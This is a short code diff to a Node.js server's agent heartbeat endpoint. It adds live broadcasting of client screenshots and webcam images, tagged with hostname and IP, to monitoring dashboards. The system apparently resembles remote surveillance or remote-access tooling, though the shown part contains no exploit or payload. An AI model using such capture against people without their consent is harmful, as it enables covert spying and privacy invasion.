@@ -263,10 +263,27 @@ app.post('/api/agent/heartbeat', (req, res) => {
       if (r.screenshot) {
         clientData.latestScreenshot = r.screenshot;
         clientData.screenshotTime = new Date().toLocaleTimeString('id-ID');
+        broadcastToDashboards({
+          type: 'SCREENSHOT_UPDATE',
+          clientId: uniqueId,
+          image: r.screenshot,
+          time: clientData.screenshotTime,
+          hostname: clientData.hostname,
+          ip: clientData.ip
+        });
       }
       if (r.cameraImage) {
         clientData.latestCameraImage = r.cameraImage;
         clientData.cameraTime = new Date().toLocaleTimeString('id-ID');
+        broadcastToDashboards({
+          type: 'CAMERA_UPDATE',
+          clientId: uniqueId,
+          image: r.cameraImage,
+          time: clientData.cameraTime,
+          hostname: clientData.hostname,
+          ip: clientData.ip,
+          webcamName: clientData.webcamName
+        });
       }
     });
   }
